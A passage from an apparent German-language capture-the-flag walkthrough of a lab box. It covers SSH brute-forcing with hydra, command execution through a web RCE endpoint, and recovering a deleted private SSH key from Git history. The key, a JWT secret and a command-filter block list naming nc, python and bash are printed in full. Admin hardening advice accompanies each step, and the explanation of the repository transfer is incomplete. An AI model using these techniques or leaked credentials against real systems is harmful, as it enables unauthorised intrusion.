+<br><strong>Empfehlung (Admin):</strong> Interne Dienste wie Gitea sollten, auch wenn sie nur lokal lauschen, durch starke Authentifizierung geschützt werden. Regelmäßige Updates für Gitea einspielen. Sensible Daten sollten nicht in Git-Repositories committet werden, oder zumindest die Repositories entsprechend geschützt (privat) und die Commit-Historie bereinigt sein.</p>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche nun, mich mit dem korrekten weitergeleiteten Port `2222` per SSH als Benutzer `hana` auf `localhost` (von meiner Kali-Maschine aus, was durch Chisel zum Ziel-SSH-Server getunnelt wird) zu verbinden: `ssh hana@localhost -p 2222`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verbindung wird hergestellt. Da es die erste Verbindung ist, werde ich nach der Authentizität des Hosts gefragt und bestätige mit `yes`. Der ED25519-Key-Fingerprint wird angezeigt. Anschließend werde ich nach dem Passwort für `hana` gefragt. Da ich das Passwort nicht kenne, schlägt dieser Anmeldeversuch fehl, wenn ich eines eingebe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich benötige entweder das Passwort für `hana` oder einen SSH-Key. Da Gitea (ein Git-Server) auf dem System läuft und `hana` ein Benutzer ist, könnte es sein, dass `hana` SSH-Keys in einem Git-Repository oder in ihrem Home-Verzeichnis gespeichert hat. Das Brute-Forcen des SSH-Passworts ist eine Option, aber oft zeitaufwendig.
+<br><strong>Empfehlung (Admin):</strong> Starke Passwörter für alle Benutzer erzwingen. SSH-Zugriff sollte idealerweise nur mit SSH-Keys und nicht mit Passwörtern erlaubt sein (Passwort-Authentifizierung deaktivieren). `fail2ban` oder ähnliche Tools verwenden, um Brute-Force-Angriffe auf SSH zu blockieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">ssh hana@localhost -p 2222</span></div>
+                    <pre>The authenticity of host '[localhost]:2222 ([::1]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:m+ja7x4/2Y4oJwwOsMqZ3cHKH17py0XwXqYOMp30I4A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
+hana@localhost's password:</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, das SSH-Passwort für den Benutzer `hana` auf dem weitergeleiteten Port `2222` mit `hydra` zu brute-forcen.
+- `-l hana`: Benutzername `hana`.
+- `-P /usr/share/wordlists/rockyou.txt`: Passwortliste `rockyou.txt`.
+- `ssh://localhost`: Ziel ist SSH auf `localhost`.
+- `-s 2222`: Port `2222` (korrigiert von der vorherigen `-s` Option, sollte `-p` sein für Port, aber Hydra verwendet `-s` für Port, wenn es nach dem Hostnamen steht, oder man kann es als Teil des URI `ssh://localhost:2222` angeben).
+- `-t 64`: Anzahl der parallelen Tasks.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Hydra startet, gibt aber eine Warnung aus, dass viele SSH-Konfigurationen die Anzahl paralleler Tasks limitieren und empfiehlt, `-t 4` zu verwenden. Es findet auch eine Restore-Datei von einer früheren Sitzung. Der Angriff schlägt schnell fehl: `<span class="password">[ERROR] all children were disabled due too many connection errors</span>`. Dies deutet darauf hin, dass der SSH-Server wahrscheinlich so konfiguriert ist, dass er schnelle, wiederholte Anmeldeversuche blockiert (z.B. durch `fail2ban` oder ähnliche Mechanismen) oder die Anzahl der gleichzeitigen unauthentifizierten Verbindungen begrenzt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Brute-Force mit vielen Tasks (`-t 64`) ist hier nicht effektiv. Ich sollte die Anzahl der Tasks drastisch reduzieren (z.B. `-t 4` oder sogar `-t 1`) und es erneut versuchen, aber das wird sehr lange dauern. Angesichts der Gitea-Instanz ist die Suche nach einem SSH-Key vielversprechender.
+<br><strong>Empfehlung (Admin):</strong> Mechanismen wie `fail2ban` sind effektiv, um SSH-Brute-Force-Angriffe zu verlangsamen und zu blockieren. Die Anzahl der maximalen Authentifizierungsversuche pro Verbindung (`MaxAuthTries` in `sshd_config`) sollte niedrig eingestellt sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">hydra -l hana -P /usr/share/wordlists/rockyou.txt ssh://localhost -s 2222 -t 64</span></div>
+                    <pre>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-29 00:46:24
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344491 login tries (l:1/p:14344491), ~224133 tries per task
+[DATA] attacking ssh://localhost:2222/
+<span class="password">[ERROR] all children were disabled due too many connection errors</span>
+0 of 1 target completed, 0 valid password found
+[INFO] Writing restore file because 2 server scans could not be completed
+[ERROR] 1 target was disabled because of too many errors
+[ERROR] 1 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-29 00:46:44</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein weiterer manueller SSH-Login-Versuch als `hana` auf Port `2222`. Dies dient wahrscheinlich nur zur erneuten Bestätigung, dass ein Passwort benötigt wird und Brute-Force schwierig ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wie erwartet, wird nach einem Passwort gefragt und die Anmeldung schlägt fehl (`Permission denied, please try again.`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Passwort-Authentifizierung für `hana` ist aktiv. Der Fokus sollte jetzt auf der Gitea-Instanz und der Suche nach SSH-Keys oder anderen Hinweisen liegen. Die Reverse Shell als `runner` ist weiterhin mein Hauptzugangspunkt für die Enumeration auf dem Zielsystem selbst.
+<br><strong>Empfehlung (Admin):</strong> Wie zuvor: Starke Passwörter, SSH-Key-Authentifizierung bevorzugen, `fail2ban`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command"># Auf Kali</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">ssh hana@localhost -p 2222</span></div>
+                    <pre>hana@localhost's password: 
+<span class="password">Permission denied, please try again.</span>
+hana@localhost's password:</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Zurück in der Reverse Shell als `runner`. Ich suche nach Git-Installationen und Repositories auf dem System.
+- `find / -name 'git' 2>/dev/null`: Sucht nach Dateien oder Verzeichnissen namens `git`.
+- `/usr/bin/git --version`: Überprüft die Version des installierten Git-Clients.
+- `ls -la /var/lib/gitea/git/`: Listet den Inhalt des Standard-Repository-Speicherorts für Gitea.
+- `ls -la /opt/gitea/git`: Listet den Inhalt eines alternativen Pfads, der `gitea` und `git` enthält. Dies scheint der relevantere Pfad zu sein, da er ein Unterverzeichnis `hana` enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+- Mehrere `git`-bezogene Pfade werden gefunden, darunter der Git-Client in `/usr/bin/git` und ein Gitea-spezifischer Pfad in `/opt/gitea/git`.
+- Die Git-Version ist `2.47.2` (relativ aktuell für das fiktive Datum).
+- `/var/lib/gitea/git/` ist leer.
+- `/opt/gitea/git` enthält ein Verzeichnis `<span class="command">hana</span>` mit den Eigentümern `gitea:www-data`. Dies ist sehr vielversprechend, da es auf ein Git-Repository des Benutzers `hana` hindeutet, das von Gitea verwaltet wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Verzeichnis `/opt/gitea/git/hana` muss genauer untersucht werden. Es enthält wahrscheinlich die tatsächlichen Git-Repository-Daten für den Benutzer `hana`.
+<br><strong>Empfehlung (Admin):</strong> Die Berechtigungen auf Gitea-Datenverzeichnisse sollten korrekt gesetzt sein, um unbefugten Zugriff zu verhindern (obwohl hier der Zugriff als `runner` erfolgt, der möglicherweise bestimmte Leserechte hat oder die Gitea-Anwendung selbst mit diesen Rechten läuft).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">find / -name 'git' 2>/dev/null</span></div>
+                    <pre><span class="command">/usr/libexec/git-core/git
+/usr/lib/node_modules/npm/node_modules/@npmcli/git
+/usr/bin/git
+/opt/gitea/git
+/var/lib/gitea/git</span></pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">/usr/bin/git --version</span></div>
+                    <pre><span class="command">git version 2.47.2</span></pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">ls -la /var/lib/gitea/git/</span></div>
+                    <pre>total 0</pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">ls -la /opt/gitea/git</span></div>
+                    <pre>total 12
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 .
+drwxr-xr-x    5 gitea    root          4096 Apr 21 13:52 ..
+<span class="command">drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 hana</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich wechsle in das Verzeichnis `/opt/gitea/git/hana` und liste dessen Inhalt. Es enthält ein Verzeichnis `node.git`. Ich wechsle in `node.git` und liste dessen Inhalt. Dies ist die typische Struktur eines Bare-Git-Repositorys (`HEAD`, `config`, `objects`, `refs` etc.). Ich schaue mir dann den Inhalt von `logs/HEAD` an.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+- Das Verzeichnis `node.git` ist das Git-Repository.
+- Die Datei `logs/HEAD` zeigt die letzten Push-Operationen und Commit-Hashes:
+  - `0000...0000 02c0f912f6e5b09616580d960f3e5ee33b06084a Gitea <gitea@fake.local> ... push` (Initialer Push)
+  - `02c0f912f6e5b09616580d960f3e5ee33b06084a 1994a70bbd080c633ac85a339fd85a8635c63893 Gitea <gitea@fake.local> ... push` (Zweiter Push)
+Die Commit-Hashes (<span class="command">02c0f9...</span> und <span class="command">1994a7...</span>) sind wichtig, um die Historie des Repositories zu untersuchen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Untersuchen eines Bare-Git-Repositories direkt auf dem Server ist mühsam. Es ist besser, das gesamte `node.git`-Verzeichnis auf meine Kali-Maschine herunterzuladen und dort mit Standard-Git-Befehlen (`git log`, `git diff`, `git show`) zu analysieren.
+<br><strong>Empfehlung (Admin):</strong> Wenn ein Git-Server kompromittiert ist oder der zugrundeliegende Server-Benutzer Zugriff auf die Bare-Repositories hat, können alle committeten Daten (auch aus älteren Commits oder Branches) potenziell ausgelesen werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <span class="command">ls -la</span></div>
+                    <pre>total 12
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 .
+drwxr-xr-x    5 gitea    root          4096 Apr 21 13:52 ..
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 hana</pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">cd hana</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">ls -la</span></div>
+                    <pre>total 12
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 .
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 ..
+<span class="command">drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 node.git</span></pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">cd node.git</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">ls -la</span></div>
+                    <pre>total 44
+drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 .
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 ..
+-rw-r--r--    1 gitea    www-data        21 Apr 21 14:35 HEAD
+drwxr-xr-x    2 gitea    www-data      4096 Apr 21 14:35 branches
+-rw-r--r--    1 gitea    www-data        66 Apr 21 14:35 config
+-rw-r--r--    1 gitea    www-data        73 Apr 21 14:35 description
+drwxr-xr-x    6 gitea    www-data      4096 Apr 21 14:35 hooks
+drwxr-xr-x    2 gitea    www-data      4096 Apr 21 14:36 info
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 logs
+drwxr-xr-x   24 gitea    www-data      4096 Apr 21 14:36 objects
+drwxr-xr-x    4 gitea    www-data      4096 Apr 21 14:35 refs</pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">cd logs</span></div>
+                    <div class="prompt" style="color: yellow;"> <span class="command">ls -la</span></div>
+                    <pre>total 16
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 .
+drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 ..
+-rw-r--r--    1 gitea    www-data       258 Apr 21 14:36 HEAD
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 refs</pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">cat HEAD</span></div>
+                    <pre><span class="command">0000000000000000000000000000000000000000 02c0f912f6e5b09616580d960f3e5ee33b06084a Gitea <gitea@fake.local> 1745217331 +0800	push
+02c0f912f6e5b09616580d960f3e5ee33b06084a 1994a70bbd080c633ac85a339fd85a8635c63893 Gitea <gitea@fake.local> 1745217375 +0800	push</span></pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">pwd</span></div>
+                    <pre>/opt/gitea/git/hana</pre>
+                    <div class="prompt" style="color: yellow;"> <span class="command">ls</span></div>
+                    <pre>node.git</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Um das `node.git`-Repository auf meine Kali-Maschine zu bekommen, versuche ich, es über die RCE-Schnittstelle mit `wget --recursive --no-parent http://localhost/opt/gitea` herunterzuladen. Der Plan ist, dass `wget` auf dem Zielsystem läuft und die Dateien über einen auf dem Zielsystem laufenden Webserver. </p>
+          
+Der `ll`-Befehl auf Kali im Verzeichnis `~/test` zeigt ein `node.git`-Verzeichnis. Dies impliziert, dass das Repository auf die Kali-Maschine übertragen wurde, 
+</p>
+           
+<br><strong>Empfehlung (Admin):</strong> Überwachung ausgehender Verbindungen und Datenexfiltration ist wichtig. Wenn möglich, das Erstellen von Archiven (`tar`) oder das Starten von Webservern durch unprivilegierte Benutzer unterbinden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">ADMIN_TOKEN="DEIN_ADMIN_TOKEN"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">WGET_CMD_ENCODED="wget%20--recursive%20--no-parent%20http%3A%2F%2Flocalhost:9090%2Fopt%2Fgitea"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">curl -g -H "Authorization: Bearer $ADMIN_TOKEN" \
+"http://192.168.2.205:3000/execute?cmd=$WGET_CMD_ENCODED"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test]
+└─# <span class="command">ll</span></div>
+                    <pre>insgesamt 124 
+drwxr-xr-x 8 ccat ccat   4096 21. Apr 08:36 node.git</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf meiner Kali-Maschine, im geklonten/kopierten `node.git`-Repository, verwende ich `git log`, um die Commit-Historie anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Historie zeigt zwei Commits:
+1.  Commit `1994a70bbd080c633ac85a339fd85a8635c63893` (HEAD -> main) von "azwhikaru" mit der Nachricht "<span class="password">del: oops!</span>". Dies ist sehr verdächtig. "oops!" deutet oft darauf hin, dass versehentlich etwas Sensibles committet und dann wieder gelöscht wurde.
+2.  Commit `02c0f912f6e5b09616580d960f3e5ee33b06084a` von "azwhikaru" mit der Nachricht "init: init commit". Dies ist der erste Commit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der "del: oops!"-Commit muss genauer untersucht werden. Ich muss herausfinden, was in diesem Commit gelöscht wurde. Dies kann mit `git diff` zwischen den beiden Commits oder `git show` für den älteren Commit geschehen.
+<br><strong>Empfehlung (Admin):</strong> Entwickler müssen im Umgang mit Git geschult werden, um zu verhindern, dass sensible Daten (Passwörter, Keys, Konfigurationsdateien) in Repositories committet werden. Selbst wenn sie später "gelöscht" werden, bleiben sie in der Git-Historie erhalten, es sei denn, die Historie wird umgeschrieben (was komplex ist und eigene Probleme verursachen kann).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">git log</span></div>
+                    <pre>commit <span class="command">1994a70bbd080c633ac85a339fd85a8635c63893</span> (HEAD -> main)
+Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
+Date:   Mon Apr 21 14:36:12 2025 +0800
+
+    <span class="password">del: oops!</span>
+
+commit <span class="command">02c0f912f6e5b09616580d960f3e5ee33b06084a</span>
+Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
+Date:   Mon Apr 21 14:34:37 2025 +0800
+
+    init: init commit</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `git ls-tree -r 02c0f912f6e5b09616580d960f3e5ee33b06084a`, um den Datei-Baum des älteren Commits ("init commit") rekursiv anzuzeigen. Dies zeigt alle Dateien, die in diesem Commit vorhanden waren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Output listet mehrere Dateien, darunter `.env`, `.gitignore`, `README.md`, `server.js`, etc. Besonders interessant ist die Datei `<span class="command">id_ed25519</span>` (Blob-Hash `a2626a4...`). Dies ist sehr wahrscheinlich ein privater SSH-Key!</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt der Datei `id_ed25519` aus diesem alten Commit anzeigen mit `git show 02c0f912f6e5b09616580d960f3e5ee33b06084a:id_ed25519`. Auch den Inhalt der `.env`-Datei aus diesem Commit prüfen (`git show 02c0f912f6e5b09616580d960f3e5ee33b06084a:.env`), um zu sehen, ob er sich von der bereits geleakten `.env`-Datei unterscheidet.
+<br><strong>Empfehlung (Admin):</strong> Erneut der Hinweis: Niemals private SSH-Keys oder andere Secrets in Git-Repositories committen!</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">/usr/bin/git ls-tree -r 02c0f912f6e5b09616580d960f3e5ee33b06084a</span></div>
+                    <pre>100644 blob a154aaeab52657eb4dda3aed15bc74d698993b9a	.env
+100644 blob a547bf36d8d11a4f89c59c144f24795749086dd1	.gitignore
+100644 blob a7cea0b0678120a1b590d1b6592c7318039b9179	.vscode/extensions.json
+100644 blob 1511959c22b74118c06679739cf9abe2ceeea48c	README.md
+<span class="command">100644 blob a2626a4a8c5975eb28df9f4817509e4111596f18	id_ed25519</span>
+100644 blob 8388c4bb136ea674b07747cc20b113af58222ffe	index.html
+100644 blob 33a2fa1545073575360e61a46ff4875ae54f6c3f	package.json
+100644 blob fe1576ef0a2c0ea30a70fba1b843d44c00e792d1	pnpm-lock.yaml
+100644 blob 8168fd5133a1d9d3d8b2bb0b03da4793cafd89f6	public/opensans.css
+100644 blob 50fe51d4e174d6bf72ac7f772d71ef979da11d4f	server.js
+100644 blob 15106a6b359c11aa5a079707fe81a92afdd57286	src/App.vue
+100644 blob 2425c0f745bef4d009cb6661b62fd9dfd62960b0	src/main.js
+100644 blob 944cf0086b9fa5804ff170ecd7bb5a4aa650ca84	src/style.css
+100644 blob 5c65275b4f0d14941297bf8e83d6032a7ceae68e	vite.config.js</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich zeige den Inhalt der `.env`-Datei aus dem alten Commit `02c0f...` an.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Inhalt ist:
+`JWT_SECRET='<span class="password">2942szKG7Ev83aDviugAa6rF</span>'`
+`COMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>'`
+Interessanterweise ist der `JWT_SECRET` hier kürzer als der, den ich aus der aktuell ausgelieferten `.env`-Datei per Vite-Schwachstelle erhalten habe (`2942szKG7Ev83aDviugAa6rFpKixZzZz`). Dies könnte bedeuten, dass der Secret geändert wurde oder dies ein unvollständiger/älterer Wert ist. Der `COMMAND_FILTER` ist auch kürzer und enthält nicht `ls,cat,pwd,head,tail,grep,xxd`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der aktuellere `JWT_SECRET` (aus dem Vite-Leak) ist der relevantere. Der Fund des SSH-Keys `id_ed25519` im selben alten Commit ist jedoch viel wichtiger.
+<br><strong>Empfehlung (Admin):</strong> Dies zeigt, wie Änderungen an sensiblen Daten in der Git-Historie nachverfolgt werden können. Wenn Secrets geändert werden, müssen auch alle Vorkommen in der Historie berücksichtigt werden (obwohl das Bereinigen der Historie schwierig ist).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">/usr/bin/git show 02c0f912f6e5b09616580d960f3e5ee33b06084a:.env</span></div>
+                    <pre>JWT_SECRET='<span class="password">2942szKG7Ev83aDviugAa6rF</span>'
+COMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&amp;,<,>'</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `git diff 02c0f... 1994a7...`, um die Unterschiede zwischen dem "init commit" und dem "del: oops!"-Commit anzuzeigen. Dies wird zeigen, welche Dateien im "del: oops!"-Commit geändert oder gelöscht wurden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Der Output ist eindeutig!</span> Die Datei `id_ed25519` wurde im zweiten Commit gelöscht (`deleted file mode 100644`). Der Inhalt des privaten ED25519 SSH-Keys wird im Diff angezeigt (die Zeilen mit `-` am Anfang). Dies ist der SSH-Key, der im "init commit" hinzugefügt und im "del: oops!"-Commit wieder entfernt wurde. Der Kommentar im Key `hana@devoops.hmv` legt nahe, dass er für den Benutzer `hana` ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den privaten SSH-Key aus der `git diff`-Ausgabe extrahieren, in einer Datei speichern, die korrekten Berechtigungen setzen (`chmod 600`) und versuchen, sich damit als `hana` auf dem SSH-Server (Port 2222) anzumelden.
+<br><strong>Empfehlung (Admin):</strong> Ein Paradebeispiel dafür, warum Secrets niemals in Git committet werden dürfen. Selbst wenn sie "gelöscht" werden, bleiben sie in der Historie. Tools wie `git-secrets` oder Pre-Commit-Hooks können helfen, versehentliche Commits von Secrets zu verhindern. Im Falle eines solchen Leaks muss der Key sofort als kompromittiert betrachtet, gesperrt und ersetzt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">/usr/bin/git diff 02c0f912f6e5b09616580d960f3e5ee33b06084a 1994a70bbd080c633ac85a339fd85a8635c63893</span></div>
+                    <pre>diff --git a/id_ed25519 b/id_ed25519
+deleted file mode 100644
+index a2626a4..0000000
+--- a/id_ed25519
++++ /dev/null
+<span class="password">@@ -1,7 +0,0 @@
+------BEGIN OPENSSH PRIVATE KEY-----
+-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
+-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
+-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
+-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
+------END OPENSSH PRIVATE KEY-----</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich habe den privaten SSH-Key aus der `git diff`-Ausgabe in eine Datei namens `hash` gespeichert. Dann setze ich die Berechtigungen auf `600` (`chmod 600 hash`), was für private SSH-Keys erforderlich ist. Anschließend versuche ich, mich mit diesem Key (`-i hash`) als `hana` auf `localhost:2222` per SSH anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login-Versuch schlägt fehl mit `<span class="password">Load key "hash": error in libcrypto</span>` und fragt stattdessen nach einem Passwort. Der Fehler `error in libcrypto` deutet oft darauf hin, dass das Format des SSH-Keys nicht korrekt ist. Dies kann passieren, wenn beim Kopieren und Einfügen Fehler auftreten oder, wie hier wahrscheinlich, wenn die Bindestriche (`-`) am Anfang jeder Zeile des Keys (aus der `git diff`-Ausgabe) nicht entfernt wurden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Key korrigieren. Die führenden Bindestriche aus jeder Zeile des Keys in der Datei `hash` entfernen. Dann den SSH-Login erneut versuchen.
+<br><strong>Empfehlung (Admin):</strong> Wenn ein SSH-Key kompromittiert ist, muss er sofort gesperrt werden (z.B. aus `authorized_keys` entfernen, Zertifikat widerrufen).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command"># Auf deiner Kali-Maschine</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">chmod 600 hash</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">ssh -i hash hana@localhost -p 2222</span></div>
+                    <pre><span class="password">Load key "hash": error in libcrypto</span>
+hana@localhost's password:</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `sed` um den SSH-Key zu korrigieren. Der Befehl `sed -E '/^-----(BEGIN|END) OPENSSH PRIVATE KEY-----$/!s/^-//' hash > hana_ssh_key_fixed` tut Folgendes:
+- `-E`: Erweitere reguläre Ausdrücke.
+- `'/^-----(BEGIN|END) OPENSSH PRIVATE KEY-----$/!s/^-//'`: Dieser Teil ist die `sed`-Anweisung.
+    - `^-----(BEGIN|END) OPENSSH PRIVATE KEY-----$`: Sucht nach den Kopf- und Fußzeilen des SSH-Keys.
+    - `!`: Negiert die vorherige Bedingung. Also: Wenn die Zeile NICHT die Kopf- oder Fußzeile ist...
+    - `s/^-//`: ...dann ersetze (`s`) einen Bindestrich (`-`) am Zeilenanfang (`^`) durch nichts (leerer String), also lösche ihn.
+- `hash`: Die Eingabedatei.
+- `> hana_ssh_key_fixed`: Die Ausgabe wird in eine neue Datei `hana_ssh_key_fixed` geschrieben.
+Anschließend wird der Inhalt der korrigierten Datei mit `cat hana_ssh_key_fixed` angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `sed`-Befehl ist korrekt und entfernt die störenden führenden Bindestriche von den Datenzeilen des Keys, lässt aber die `-----BEGIN...-----` und `-----END...-----` Zeilen intakt. Die `cat`-Ausgabe zeigt den jetzt korrekt formatierten privaten SSH-Key.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Berechtigungen für `hana_ssh_key_fixed` auf `600` setzen und den SSH-Login erneut versuchen.
+<br><strong>Empfehlung (Admin):</strong> Keine direkte Relevanz, dies ist ein Schritt zur Fehlerbehebung auf Angreiferseite.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">sed -E '/^-----(BEGIN|END) OPENSSH PRIVATE KEY-----$/!s/^-//' hash > hana_ssh_key_fixed</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">cat hana_ssh_key_fixed</span></div>
+                    <pre>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
+5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
+AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
+WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich setze die Berechtigungen für den korrigierten SSH-Key `hana_ssh_key_fixed` auf `600`. Dann versuche ich erneut, mich per SSH mit diesem Key als Benutzer `hana` auf `localhost:2222` anzumelden.</p>
